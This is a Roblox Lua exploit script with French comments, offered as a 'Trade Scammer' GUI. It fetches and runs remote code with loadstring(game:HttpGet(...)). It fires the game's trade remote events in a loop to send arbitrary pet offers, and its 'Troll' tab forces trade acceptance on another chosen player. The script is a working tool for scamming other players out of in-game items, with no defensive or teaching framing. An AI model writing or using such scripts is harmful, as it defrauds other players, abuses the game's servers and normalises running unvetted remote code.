-- LocalScript sous StarterGui > ScreenGui

-- Charger Orion
local OrionLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/jensonhirst/Orion/main/source"))()

-- Créer la fenêtre principale
local Window = OrionLib:MakeWindow({
    Name = "Trade Scammer",
    HidePremium = false,
    SaveConfig = true,
    ConfigFolder = "TradeScammer",
    IntroText = "Trade Scammer GUI V1",
})

-- Onglet Main pour envoyer les pets
local MainTab = Window:MakeTab({
    Name = "Main",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

-- Variables par défaut pour Main
local petBaseName = "Diamond Triple Dominus_"
local startIndex = 1
local endIndex = 10
local waitTime = 0.0
local confirm = true

-- Éléments UI Main
MainTab:AddTextbox({
    Name = "Préfixe du Pet",
    Default = petBaseName,
    TextDisappear = false,
    Callback = function(value)
        petBaseName = value
    end
})
MainTab:AddSlider({ Name = "Index Début", Min = 1, Max = 300, Default = startIndex, Increment = 1, ValueName = "Début",
    Callback = function(value) startIndex = value end
})
MainTab:AddSlider({ Name = "Index Fin",   Min = 1, Max = 300, Default = endIndex,   Increment = 1, ValueName = "Fin",
    Callback = function(value) endIndex = value end
})
MainTab:AddSlider({ Name = "Délai (s)",   Min = 0, Max = 5,    Default = waitTime,   Increment = 0.1, ValueName = "Wait Time",
    Callback = function(value) waitTime = value end
})
MainTab:AddToggle({ Name = "Confirm Boolean", Default = confirm,
    Callback = function(value) confirm = value end
})
MainTab:AddButton({ Name = "Envoyer les Pets",
    Callback = function()
        if startIndex > endIndex then
            OrionLib:MakeNotification({ Name = "Erreur", Content = "L’index de début doit être ≤ index de fin.", Image = "rbxassetid://3926305904", Time = 3 })
            return
        end
        for i = startIndex, endIndex do
            local petName = petBaseName .. i
            game:GetService("ReplicatedStorage"):WaitForChild("TradeRemotes"):WaitForChild("TradeOfferEvent"):FireServer(petName, confirm)
            wait(waitTime)
        end
        OrionLib:MakeNotification({ Name = "Succès", Content = ("Envoyé %d pets de %s à %s!"):format(endIndex - startIndex + 1, petBaseName..startIndex, petBaseName..endIndex), Image = "rbxassetid://3926305904", Time = 4 })
    end
})

-- Onglet Troll pour forcer le trade sur un joueur choisi
local TrollTab = Window:MakeTab({
    Name = "Troll",
    Icon = "rbxassetid://6031090996",
    PremiumOnly = false
})

local selectedPlayer = nil

-- Fonction pour récupérer la liste des joueurs incluant un placeholder
local function getPlayerList()
    local list = {"No player selected"}
    for _, plr in pairs(game:GetService("Players"):GetPlayers()) do
        if plr ~= game.Players.LocalPlayer then
            table.insert(list, plr.Name)
        end
    end
    return list
end

-- Créer le dropdown initial avec placeholder
local PlayerDropdown = TrollTab:AddDropdown({
    Name = "Select Player",
    Default = "No player selected",
    Options = getPlayerList(),
    Callback = function(option)
        if option == "No player selected" then
            selectedPlayer = nil
        else
            selectedPlayer = option
        end
    end
})

-- Bouton pour rafraîchir la liste des joueurs
TrollTab:AddButton({
    Name = "Refresh Player List",
    Callback = function()
        local newList = getPlayerList()
        PlayerDropdown:Refresh(newList, true)
        PlayerDropdown:Set("No player selected")
        selectedPlayer = nil
        OrionLib:MakeNotification({ Name = "Updated", Content = "Player list refreshed.", Image = "rbxassetid://3926305904", Time = 2 })
    end
})

-- Bouton pour forcer le trade
TrollTab:AddButton({
    Name = "Force Trade",
    Callback = function()
        if not selectedPlayer then
            OrionLib:MakeNotification({ Name = "Error", Content = "No player selected.", Image = "rbxassetid://3926305904", Time = 3 })
            return
        end
        game:GetService("ReplicatedStorage"):WaitForChild("TradeRemotes"):WaitForChild("TradeRequestAcceptEvent"):FireServer(game.Players:FindFirstChild(selectedPlayer))
        OrionLib:MakeNotification({ Name = "Success", Content = "Trade request sent to "..selectedPlayer, Image = "rbxassetid://3926305904", Time = 3 })
    end
})

-- Initialiser l’UI
OrionLib:Init()
